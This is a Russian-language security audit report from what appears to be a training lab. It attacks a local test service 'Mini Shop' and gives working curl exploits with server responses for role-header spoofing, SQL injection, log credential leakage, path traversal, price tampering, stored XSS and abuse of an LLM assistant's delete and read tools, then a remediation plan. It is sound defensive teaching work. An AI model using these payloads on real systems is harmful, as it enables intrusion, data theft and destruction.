# Отчёт 1. Атаки на исходный сервис Mini Shop

**Дата проведения аудита:** 26 октября 2026 г.  
**Исследуемый объект:** Локальный веб-сервис `Mini Shop` ([`practices/practice_06/lab/service.py`](file:///home/mak/aifirst/ITMOv2/practices/practice_06/lab/service.py)), запущенный на `http://127.0.0.1:8066`.  
**Связанная модель угроз:** [THREAT_MODEL.md](file:///home/mak/aifirst/ITMOv2/practices/practice_06/THREAT_MODEL.md).

---

## 1. Сводка выявленных уязвимостей

В ходе динамического и статического анализа исходного сервиса `Mini Shop` было обнаружено и успешно проэксплуатировано **8 ключевых классов уязвимостей** (12 векторов атак по классификатору STRIDE и OWASP Top 10 for LLM):

| ID | Класс уязвимости | Эндпоинт / Компонент | CWE / OWASP | Критичность | Результат эксплойта |
|:---|:---|:---|:---|:---:|:---:|
| **V-01** | Спуфинг роли Staff через HTTP-заголовок | `GET /admin/export` | CWE-287 / API1 | **CRITICAL** | Успешная выгрузка базы профилей без токена |
| **V-02** | SQL Injection (SQLi) | `/profile`, `/search`, `/assistant/context` | CWE-89 / API8 | **CRITICAL** | Извлечение данных БД через UNION и тавтологии |
| **V-03** | Утечка паролей и токенов в логах | `GET /debug/logs` | CWE-532 / API3 | **CRITICAL** | Перехват паролей из `/login` и токенов сессий |
| **V-04** | Excessive Agency & Tool Abuse в AI | `POST /assistant/execute` | LLM06 / CWE-862 | **CRITICAL** | Неавторизованное удаление файлов и дамп БД |
| **V-05** | BOLA / IDOR в профилях и заказах | `GET /profile`, `GET /orders` | CWE-639 / API1 | **HIGH** | Чтение чужих ПДн и заказов без авторизации |
| **V-06** | Манипуляция ценой заказа | `POST /orders` | CWE-472 / API6 | **HIGH** | Покупка товара за 0.01 руб вместо 5000 руб |
| **V-07** | Path Traversal / BOLA в файлах | `GET /files` | CWE-22 / CWE-639 | **HIGH** | Чтение чужих чеков и секрета оператора |
| **V-08** | Stored Cross-Site Scripting (XSS) | `/reviews` $\to$ `/reviews/view` | CWE-79 / API8 | **MEDIUM** | Внедрение произвольного JS в страницу отзывов |

---

## 2. Детальные протоколы эксплуатации (Proof of Concept)

### V-01: Спуфинг роли Staff через заголовок `X-Role` (T-01)
* **Уязвимый код (`service.py`, строки 74–77):**
  ```python
  if method == "GET" and url.path == "/admin/export":
      if headers.get("X-Role") != "staff":
          return 403, {"error": "staff only"}
      return 200, self.rows("SELECT * FROM profiles")
  ```
* **Анализ:** Сервер не проверяет сессионный токен `X-Token` и слепо доверяет клиентскому HTTP-заголовку `X-Role`. Любой неавторизованный пользователь может выставить данный заголовок.
* **Эксплойт:**
  ```bash
  curl -i -H "X-Role: staff" http://127.0.0.1:8066/admin/export
  ```
* **Фактический ответ сервера:**
  ```http
  HTTP/1.0 200 OK
  Content-Type: application/json; charset=utf-8

  [
    {"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"},
    {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}
  ]
  ```
* **Эффект:** Полная компрометация персональных данных пользователей (152-ФЗ) неавторизованным клиентом.

---

### V-02: Внедрение SQL-кода (SQL Injection) (T-04)
* **Уязвимый код (`service.py`, строки 57, 59, 89):**
  ```python
  # /profile
  self.rows(f"SELECT * FROM profiles WHERE id = {query.get('id', '1')}")
  # /search
  self.rows(f"SELECT * FROM profiles WHERE name LIKE '%{query.get('q', '')}%'")
  # /assistant/context
  self.rows(f"SELECT * FROM orders WHERE id = {query.get('order_id', '1')}")
  ```
* **Анализ:** Параметры запроса форматируются напрямую через f-строки без экранирования и параметризации.

#### Эксплойт 1: Тавтология в `/profile`
* **Запрос:**
  ```bash
  curl -s "http://127.0.0.1:8066/profile?id=1%20OR%201=1"
  ```
* **Результат:** Вместо одного профиля возвращаются все записи таблицы:
  ```json
  [
    {"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"},
    {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}
  ]
  ```

#### Эксплойт 2: UNION-based атака в `/search`
* **Запрос:**
  ```bash
  curl -s "http://127.0.0.1:8066/search?q=%27%20UNION%20SELECT%20id,owner,product,price%20FROM%20orders--"
  ```
* **Результат:** Через поиск по именам пользователей неавторизованный клиент извлекает данные из таблицы заказов `orders`:
  ```json
  [
    {"id": 1, "name": 1, "email": "chair", "address": 5000.0},
    {"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"},
    {"id": 2, "name": 2, "email": "lamp", "address": 1500.0},
    {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}
  ]
  ```

---

### V-03: Утечка учетных данных и токенов через `/debug/logs` (T-07)
* **Уязвимый код (`service.py`, строки 44, 81–82):**
  ```python
  self.logs.append({"method": method, "target": target, "body": body, "headers": dict(headers)})
  ...
  if method == "GET" and url.path == "/debug/logs":
      return 200, self.logs.copy()
  ```
* **Анализ:** Эндпоинт `/debug/logs` доступен без какой-либо аутентификации и возвращает полный лог входящих запросов вместе с заголовками и телами.
* **Эксплойт:**
  ```bash
  curl -s http://127.0.0.1:8066/debug/logs
  ```
* **Фактический фрагмент ответа:**
  ```json
  [
    {
      "method": "POST",
      "target": "/login",
      "body": {
        "username": "alice",
        "password": "learn-alice"
      },
      "headers": {
        "Content-Length": "48",
        "Content-Type": "application/json"
      }
    }
  ]
  ```
* **Эффект:** Атакующий перехватывает пароли клиентов и сотрудников в открытом виде, а также сессионные токены `X-Token`.

---

### V-04: Уязвимости контура AI: Excessive Agency & Tool Abuse (T-11, LLM-01)
* **Уязвимый код (`service.py`, строки 88–109):**
  ```python
  if method == "GET" and url.path == "/assistant/context":
      ...
      prompt = (
          "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\n"
          "Инструменты: read_file(path), export_profiles(), delete_tree(path).\n"
          f"Заказ: {json.dumps(orders, ensure_ascii=False)}\n"
          f"Отзывы: {json.dumps(self.reviews, ensure_ascii=False)}\n"
          f"Запрос пользователя: {query.get('question', 'Покажи чек по заказу')}"
      )
      return 200, {"prompt": prompt}

  if method == "POST" and url.path == "/assistant/execute":
      decision = body["decision"]
      tool, arguments = decision["tool"], decision.get("arguments", {})
      if tool == "read_file":
          return 200, {"content": self.sandbox.read(arguments["path"])}
      if tool == "export_profiles":
          return 200, self.rows("SELECT * FROM profiles")
      if tool == "delete_tree":
          self.sandbox.delete_tree(arguments["path"])
          return 200, {"deleted": arguments["path"]}
  ```
* **Анализ:**
  1. **Excessive Agency**: Ассистенту выданы избыточные деструктивные инструменты (`delete_tree`, `export_profiles`), хотя его задача — всего лишь выдать чек.
  2. **Отсутствие авторизации исполнителя**: Эндпоинт `/assistant/execute` не проверяет `X-Token` и не валидирует права вызывающего на манипуляцию конкретными путями.
  3. **Indirect Prompt Injection**: Отзывы из базы подмешиваются прямо в системный промпт без изоляции.

#### Эксплойт 1: Уничтожение файлов через `delete_tree`
* **Запрос:**
  ```bash
  curl -s -X POST http://127.0.0.1:8066/assistant/execute \
    -H "Content-Type: application/json" \
    -d '{"decision": {"tool": "delete_tree", "arguments": {"path": "files/bob"}}}'
  ```
* **Ответ сервера:**
  ```json
  {"deleted": "files/bob"}
  ```
* **Подтверждение разрушения данных:** При последующей попытке запроса чека Боба (`GET /files?user=bob&path=receipt.txt`) сервер возвращает ошибку 500:
  ```json
  {"error": "[Errno 2] No such file or directory: '.../files/bob/receipt.txt'", "type": "FileNotFoundError"}
  ```

#### Эксплойт 2: Чтение служебной тайны через `read_file`
* **Запрос:**
  ```bash
  curl -s -X POST http://127.0.0.1:8066/assistant/execute \
    -H "Content-Type: application/json" \
    -d '{"decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}}'
  ```
* **Ответ сервера:**
  ```json
  {"content": "TEST_ONLY_OPERATOR_SECRET"}
  ```

---

### V-05: BOLA / IDOR в профилях и заказах (T-08)
* **Уязвимый код (`service.py`, строки 56–61):**
  ```python
  if method == "GET" and url.path == "/profile":
      return 200, self.rows(f"SELECT * FROM profiles WHERE id = {query.get('id', '1')}")
  if method == "GET" and url.path == "/orders":
      return 200, self.rows("SELECT * FROM orders")
  ```
* **Анализ:**
  * Эндпоинт `GET /profile` не сопоставляет переданный `id` с сессией вызывающего пользователя. Пользователь `alice` (id=1) запрашивает `?id=2` и читает данные Боба.
  * Эндпоинт `GET /orders` отдаёт вообще все существующие заказы в магазине анонимному пользователю.
* **Эксплойт:**
  ```bash
  curl -s http://127.0.0.1:8066/orders
  ```
* **Ответ сервера:**
  ```json
  [
    {"id": 1, "owner": 1, "product": "chair", "price": 5000.0},
    {"id": 2, "owner": 2, "product": "lamp", "price": 1500.0}
  ]
  ```

---

### V-06: Манипуляция ценой заказа (Parameter Tampering) (T-03)
* **Уязвимый код (`service.py`, строки 69–71):**
  ```python
  price = body.get("price", self.products[product])
  cursor = self.db.execute("INSERT INTO orders(owner, product, price) VALUES (?, ?, ?)",
                           (session["id"], product, price))
  ```
* **Анализ:** Сервер доверяет клиентскому полю `price` в теле запроса, если оно передано, вместо принудительного использования каталожной цены из `self.products`.
* **Эксплойт:**
  ```bash
  curl -s -X POST http://127.0.0.1:8066/orders \
    -H "Content-Type: application/json" \
    -H "X-Token: e9db300f66d340d4a10876a7b014258b" \
    -d '{"product": "chair", "price": 0.01}'
  ```
* **Ответ сервера:**
  ```json
  {"id": 3, "owner": 1, "product": "chair", "price": 0.01}
  ```
* **Эффект:** Покупка дорогостоящего товара (5000 руб) за 0.01 руб. Нарушение финансовой безопасности.

---

### V-07: Обход путей и чтение чужих файлов (Path Traversal) (T-09)
* **Уязвимый код (`service.py`, строки 78–80):**
  ```python
  if method == "GET" and url.path == "/files":
      name = f"files/{query.get('user', 'alice')}/{query.get('path', 'receipt.txt')}"
      return 200, {"content": self.sandbox.read(name)}
  ```
* **Анализ:** Параметры `user` и `path` принимаются напрямую из query string без проверки, что пользователь запрашивает свои собственные чеки, и без блокировки последовательностей `../`.
* **Эксплойт:**
  ```bash
  curl -s "http://127.0.0.1:8066/files?user=alice&path=../../private/operator-note.txt"
  ```
* **Ответ сервера:**
  ```json
  {"content": "TEST_ONLY_OPERATOR_SECRET"}
  ```

---

### V-08: Хранимая межсайтовая сценаризация (Stored XSS) (T-12)
* **Уязвимый код (`service.py`, строки 83–87):**
  ```python
  if method == "POST" and url.path == "/reviews":
      self.reviews.append({"product": body["product"], "text": body["text"]})
      return 201, {"saved": True}
  if method == "GET" and url.path == "/reviews/view":
      return 200, "<html><body>" + "".join(f"<p>{r['text']}</p>" for r in self.reviews) + "</body></html>"
  ```
* **Анализ:** Поле `text` из отзыва пользователя сохраняется в оперативную память и конкатенируется в сырой HTML без применения функций экранирования (например, `html.escape`).
* **Эксплойт:**
  ```bash
  curl -s -X POST http://127.0.0.1:8066/reviews \
    -H "Content-Type: application/json" \
    -d '{"product": "chair", "text": "<script>alert(\"XSS-EXPLOITED\")</script>"}'
  
  curl -s http://127.0.0.1:8066/reviews/view
  ```
* **Ответ сервера:**
  ```html
  <html><body><p><script>alert("XSS-EXPLOITED")</script></p></body></html>
  ```
* **Эффект:** Выполнение произвольного клиентского JavaScript в контексте браузера администратора или других посетителей страницы отзывов.

---

## 3. Выводы по результатам первого этапа аудита

1. **Сервис находится в критически уязвимом состоянии**: отсутствуют базовые механизмы аутентификации и авторизации (BOLA/IDOR), доверяются клиентские заголовки роли (`X-Role`), в SQL-запросах допущены критические инъекции.
2. **Контур интеграции с LLM абсолютно беззащитен**:
   * В системный контекст подмешиваются произвольные непроверенные отзывы пользователей (Indirect Prompt Injection).
   * Исполнитель инструментов `/assistant/execute` наделен разрушительными полномочиями (`delete_tree`), которые исполняются без аутентификации и проверки прав пользователя.
   * Конфиденциальные данные (`export_profiles`, `private/operator-note.txt`) доступны для чтения через вызовы AI.
3. **Необходимый план исправлений**:
   * Реализовать строгую привязку к сессионному токену `X-Token` (RBAC).
   * Заменить все конкатенации в SQL на параметризованные запросы `?`.
   * Изолировать файловый доступ пользователя строго рамками его папки `files/<user>/`.
   * Зафиксировать цены заказов только из каталога `self.products`.
   * Экранировать HTML в отзывах через `html.escape`.
   * Ограничить или удалить деструктивные инструменты ассистента (`delete_tree`, `export_profiles`) и валидировать все операции в `/assistant/execute`.
